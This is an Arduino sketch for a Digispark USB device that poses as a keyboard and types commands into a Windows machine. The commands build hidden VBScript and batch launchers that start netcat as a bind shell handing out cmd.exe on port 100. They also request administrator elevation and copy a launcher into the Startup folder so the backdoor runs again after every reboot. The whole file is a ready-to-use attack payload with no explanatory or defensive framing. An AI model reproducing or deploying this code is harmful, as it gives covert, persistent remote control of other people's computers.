#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("echo set w=CreateObject(\"Shell.Application\") > as.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);
  DigiKeyboard.print("echo w.ShellExecute \"s.bat\",,\"C:\\p\", \"runas\", 0 >> as.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);

  DigiKeyboard.print("echo set w=CreateObject(\"WScript.Shell\") > hs.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);
  DigiKeyboard.print("echo w.Run chr(34) ^& \"C:\\p\\s.bat\" ^& chr(34), 0 >> hs.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);

  DigiKeyboard.print("echo set w=CreateObject(\"WScript.Shell\") > ht.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);
  DigiKeyboard.print("echo w.Run chr(34) ^& \"C:\\p\\t.bat\" ^& chr(34), 0 >> ht.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);

  DigiKeyboard.print("echo start C:\\p\\nc.exe -Lp 100 -vv -e cmd.exe -d > s.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);

  DigiKeyboard.print("echo cd /p ^& taskkill /im nc.exe /f ^& start as.vbs ^& timeout /t 15 ^& start hs.vbs > t.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);

  DigiKeyboard.print("copy ht.vbs /y %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
